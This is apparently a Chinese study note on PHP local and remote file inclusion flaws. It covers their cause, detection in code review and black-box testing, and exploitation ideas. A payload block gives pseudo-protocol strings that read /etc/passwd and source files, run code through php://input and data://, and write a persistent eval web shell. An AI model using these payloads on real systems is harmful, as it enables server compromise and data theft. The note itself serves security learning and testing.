## 漏洞原理

程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，
直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。
在包含文件的过程中，如果文件能进行控制，则存储文件包含漏洞

## 分类

本地包含-Local File Include-LFI
远程包含-Remote File Include-RFI

差异原因：代码过滤和环境配置文件开关决定

## 伪协议

![php伪协议](./images/php伪协议.jpg)

![各语言伪协议](./images/各语言伪协议.jpg)

```
-文件读取：

file:///etc/passwd
php://filter/read=convert.base64-encode/resource=phpinfo.php

-文件写入：

php://filter/write=convert.base64-encode/resource=phpinfo.php
php://input POST:<?php fputs(fopen('shell.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>

-代码执行：

php://input POST:<?php phpinfo();?>
data://text/plain,<?php phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

## 漏洞发现

-白盒发现：

1、可通过应用功能追踪代码定位审计
2、可通过脚本特定函数搜索定位审计
3、可通过伪协议玩法绕过相关修复等
PHP：include、require、include_once、require_once等
include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行
require函数出现错误的时候，会直接报错并退出程序的执行
Java：java.io.File、java.io.FileReader等
ASP.NET：System.IO.FileStream、System.IO.StreamReader等

-黑盒发现：

主要观察参数传递的数据和文件名是否对应
URL中有path、dir、file、page、archive、eng、语言文件等相关字眼

## 本地利用思路

1、配合文件上传

2、无文件包含日志（知道路径，默认路径测试）

3、无文件包含SESSION（知道路径，默认路径测试）

4、无文件支持伪协议利用

参考 https://blog.csdn.net/unexpectedthing/article/details/121276


## 远程利用思路

直接搭建一个可访问的远程URL包含文件

## CTF利用

利用伪协议
日志包含

## SRC复盘报告

https://mp.weixin.qq.com/s/hMUDDgRSPY6ybznYBRZ20Q

http://testphp.vulnweb.com/showimage.php?file=index.php